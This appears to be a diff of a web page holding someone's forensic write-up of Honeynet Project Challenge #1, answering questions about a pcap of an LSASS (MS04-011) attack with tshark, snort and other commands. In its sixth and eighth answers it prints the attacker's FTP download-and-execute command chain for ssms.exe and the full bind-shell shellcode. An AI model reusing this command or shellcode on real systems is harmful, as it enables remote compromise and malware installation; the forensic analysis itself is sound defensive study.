@@ -1,49 +1,93 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
 	<meta charset="utf-8">
-	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<title>Honeynet Project Challenge #1 - pcap attack trace</title>
 	<link rel="stylesheet" type="text/css" href="/css/all.min.css">
 	<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Ubuntu+Mono:400">
 	<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Open+Sans">
-	<style type="text/css">
-		ul >li:before {content: '-';position: absolute;margin-left: -.7em;}
-	</style>
+	<link rel="stylesheet" type="text/css" href="/css/highlight-8.5.min.css">
 </head>
 <body>
 	<div id="content">
-	  <div id="post">
+		<div id="post">
 		<h1><a href="http://www.honeynet.org/node/504">Honeynet Project Challenge #1 - pcap attack trace</a></h1>
 		<div id="postinfo">
-		  <div id="postdate"></div>
-		  <div id="posttags">tags: netsec, honeynet, pcap, forensic, 2010</div>
+			<div id="postdate"></div>
+			<div id="posttags">tags: netsec, honeynet, pcap, forensic, 2010</div>
 		</div>
 		<div id="postbody">
-<center><a href="atk-trace.pcap">atk-trace.pcap</a> | <a href="solution.pdf">solution.pdf</a></center>
+<center><a href="atk-trace.pcap">pcap</a> | <a href="soln.pdf">official solution</a></center>
 <ol>
-	<li>Which systems (i.e. IP addresses) are involved?<br>
-		<code class="ans tab">tshark -r atk-trace.pcap -z ip_hosts,tree -qn</code><br>
-		<span class="tab"></span>unique IP addr: <code class="ans">tshark -r atk-trace.pcap -T fields -e ip.dst -e ip.src | sort | uniq</code><br>
-		<span class="tab"></span>unique MAC addr: <code class="ans">tshark -r atk-trace.pcap -T fields -e eth.dst -e eth.src | sort | uniq</code>
-	</li>
-	<li>What can you find out about the attacking host (e.g., where is it located)?</li>
-		<span class="tab"></span><a href="http://www.hostip.info">http://www.hostip.info</a><br>
-		<code class="ans tab">p0f -r atk-trace.pcap</code><br>
-		<code class="ans tab">tshark -r atk-trace.pcap -Y "tcp.flags==0x02" -n</code><br>
-		<code class="ans tab">sudo snort -q -A console -r atk-trace.pcap</code><br>
-		<code class="ans tab">geoiplookup 98.114.205.102</code>
-	<li>How many TCP sessions are contained in the dump file?</li>
+	<li id="qn1">Which systems (i.e. IP addresses) are involved?</li>
+		<div class="tab"><code class="ans">tshark -r atk-trace.pcap -z ip_hosts,tree -qn</code></div>
+		<div class="tab">unique IP addr: <code class="ans">tshark -r atk-trace.pcap -T fields -e ip.dst -e ip.src | sort | uniq</code></div>
+		<div class="tab">unique MAC addr: <code class="ans">tshark -r atk-trace.pcap -T fields -e eth.dst -e eth.src | sort | uniq</code></div>
+
+	<li id="qn2">What can you find out about the attacking host (e.g., where is it located)?</li>
+		<div class="tab">@ <a href="http://www.hostip.info">http://www.hostip.info</a></div>
+		<div class="ans tab"><code>p0f -r atk-trace.pcap</code></div>
+		<div class="ans tab"><code>tshark -r atk-trace.pcap -Y "tcp.flags==0x02" -n</code></div>
+		<div class="ans tab"><code>sudo snort -q -A console -r atk-trace.pcap</code></div>
+		<div class="ans tab"><code>geoiplookup 98.114.205.102</code></div>
+
+	<li id="qn3">How many TCP sessions are contained in the dump file?</li>
 		<code class="ans tab">tshark -r atk-trace.pcap -qnz conv,tcp</code>
-	<li>How long did it take to perform the attack?</li>
+
+	<li id="qn4">How long did it take to perform the attack?</li>
 		<code class="ans tab">capinfos atk-trace.pcap</code>
-	<li>Which operating system was targeted by the attack? And which service? Which vulnerability?</li>
-	<li>Can you sketch an overview of the general actions performed by the attacker?</li>
-	<li>What specific vulnerability was attacked?</li>
-	<li>What actions does the shellcode perform? Pls list the shellcode.</li>
-	<li>Do you think a Honeypot was used to pose as a vulnerable victim? Why?</li>
-	<li>Was there malware involved? Whats the name of the malware? (We are not looking for a detailed malware analysis for this challenge)</li>
-	<li>Do you think this is a manual or an automated attack? Why?</li>
-</ul>
-	<center>--- <strong>FIN</strong> ---</center>
-</div></div></div></body></html>
+
+	<!-- /Applications/Wireshark.app/Contents/MacOS/tshark -r atk-trace.pcap -Y "tcp.flags.syn eq 1" -T fields -e ip.src -e ip.ttl -e tcp.window_size | sort | uniq -->
+	<li id="qn5">Which operating system was targeted by the attack? And which service? Which vulnerability?</li>
+		<span class="tab">[os] atk-trace.pcap &gt; pkt#16 &gt; Native OS: Windows 5.1 i.e. <span class="ans">Windows XP</span></span>
+		<img src="img/qn5.png">
+
+		<div class="tab">[svc] <span class="ans">Local Security Authority Subsystem Service (LSASS)</span></div>
+		<div class="tab"><code>sudo snort -q -A console -c <a href="file/qn5-snort-v2910:etc/snort.conf">snort.conf</a> -r atk-trace.pcap</code></div>
+		<pre class="wrap" style="padding:.5em;background:#f0f0f0;word-break:break-all;"><code>04/20-11:28:30.172468
+[**] [1:2514:7] NETBIOS SMB-DS DCERPC <a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service"><span class="ans">LSASS</span></a> DsRolerUpgradeDownlevelServer exploit attempt
+[**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1]
+{TCP} 98.114.205.102:1828 -> 192.150.11.111:445</code></pre>
+
+		<div class="tab">[vuln] <a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms04_011_lsass"><span class="ans">CVE-2003-0533 MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow</span></a></div>
+
+
+	<li id="qn6">Can you sketch an overview of the general actions performed by the attacker?</li>
+		<ol class="ans">
+			<li>port scan 445/tcp</li>
+			<li>connect to \\192.150.11.111\ipc$\lsarpc</li>
+			<li>exploit + bind shell to port 1957/tcp</li>
+			<li>connect to port 1957/tcp to execute <code>echo open 0.0.0.0 8884 > o&amp;echo user 1 1 >> o &amp;echo get ssms.exe >> o &amp;echo quit >> o &amp;ftp -n -s:o &amp;del /F /Q o &amp;ssms.exe<br>ssms.exe</code></li>
+		</ol>
+
+	<li id="qn7">What specific vulnerability was attacked?</li>
+		<span class="ans tab">stack buffer overflow in DsRolerUpgradeDownlevelServer() function of LSASS, subsequently used for remote code exec</span>
+
+	<li id="qn8">What actions does the shellcode perform? Pls list the shellcode.</li>
+		<span class="ans tab">bindshell on port 1957/tcp</span>
+		<!-- prepend each byte in hex w/ `\x`: sed -E 's|(.{2})|\\x\1|g' -->
+		<pre class="wrap" style="padding:.5em;background:#f0f0f0;word-break:break-all;"><code>\xeb\x10\x5a\x4a\x33\xc9\x66\xb9\x7d\x01\x80\x34\x0a\x99\xe2\xfa\xeb\x05\xe8\xeb\xff\xff\xff\x70\x95\x98\x99\x99\xc3\xfd\x38\xa9\x99\x99\x99\x12\xd9\x95\x12\xe9\x85\x34\x12\xd9\x91\x12\x41\x12\xea\xa5\x12\xed\x87\xe1\x9a\x6a\x12\xe7\xb9\x9a\x62\x12\xd7\x8d\xaa\x74\xcf\xce\xc8\x12\xa6\x9a\x62\x12\x6b\xf3\x97\xc0\x6a\x3f\xed\x91\xc0\xc6\x1a\x5e\x9d\xdc\x7b\x70\xc0\xc6\xc7\x12\x54\x12\xdf\xbd\x9a\x5a\x48\x78\x9a\x58\xaa\x50\xff\x12\x91\x12\xdf\x85\x9a\x5a\x58\x78\x9b\x9a\x58\x12\x99\x9a\x5a\x12\x63\x12\x6e\x1a\x5f\x97\x12\x49\xf3\x9a\xc0\x71\x1e\x99\x99\x99\x1a\x5f\x94\xcb\xcf\x66\xce\x65\xc3\x12\x41\xf3\x9c\xc0\x71\xed\x99\x99\x99\xc9\xc9\xc9\xc9\xf3\x98\xf3\x9b\x66\xce\x75\x12\x41\x5e\x9e\x9b\x99\x9e\x3c\xaa\x59\x10\xde\x9d\xf3\x89\xce\xca\x66\xce\x69\xf3\x98\xca\x66\xce\x6d\xc9\xc9\xca\x66\xce\x61\x12\x49\x1a\x75\xdd\x12\x6d\xaa\x59\xf3\x89\xc0\x10\x9d\x17\x7b\x62\x10\xcf\xa1\x10\xcf\xa5\x10\xcf\xd9\xff\x5e\xdf\xb5\x98\x98\x14\xde\x89\xc9\xcf\xaa\x50\xc8\xc8\xc8\xf3\x98\xc8\xc8\x5e\xde\xa5\xfa\xf4\xfd\x99\x14\xde\xa5\xc9\xc8\x66\xce\x79\xcb\x66\xce\x65\xca\x66\xce\x65\xc9\x66\xce\x7d\xaa\x59\x35\x1c\x59\xec\x60\xc8\xcb\xcf\xca\x66\x4b\xc3\xc0\x32\x7b\x77\xaa\x59\x5a\x71\x76\x67\x66\x66\xde\xfc\xed\xc9\xeb\xf6\xfa\xd8\xfd\xfd\xeb\xfc\xea\xea\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc\xea\xea\xd8\x99\xdc\xe1\xf0\xed\xcd\xf1\xeb\xfc\xf8\xfd\x99\xd5\xf6\xf8\xfd\xd5\xf0\xfb\xeb\xf8\xeb\xe0\xd8\x99\xee\xea\xab\xc6\xaa\xab\x99\xce\xca\xd8\xca\xf6\xfa\xf2\xfc\xed\xd8\x99\xfb\xf0\xf7\xfd\x99\xf5\xf0\xea\xed\xfc\xf7\x99\xf8\xfa\xfa\xfc\xe9\xed\x99\xfa\xf5\xf6\xea\xfc\xea\xf6\xfa\xf2\xfc\xed\x99</code></pre>
+
+	<li id="qn9">Do you think a Honeypot was used to pose as a vulnerable victim? Why?</li>
+		<span class="ans tab">yes, it ignores instruction to connect to an <code>ftp</code> service @ invalid IPv4 address 0.0.0.0</span>
+
+	<!-- echo "41424344" | xxd -r -p -->
+	<li id="qn10">Was there malware involved? What's the name of the malware?</li>
+		<span class="ans tab">yes; an Rbot backdoor</span>
+
+	<li id="qn11">Do you think this is a manual or an automated attack? Why?</li>
+		<span class="ans tab">automated; attack duration too short (~16s) to be manual, invalid IPv4 address 0.0.0.0 specified</span>
+</ol>
+<center class="print-hidden">--- <strong>FIN</strong> ---</center>
+</div></div></div>
+<script type="text/javascript" src="/js/jquery-1.11.3.min.js"></script>
+<script type="text/javascript" src="/js/highlight-8.5.min.js"></script>
+<script type="text/javascript">hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+	$(function () {
+		"use strict";
+	});
+</script>
+</body></html>
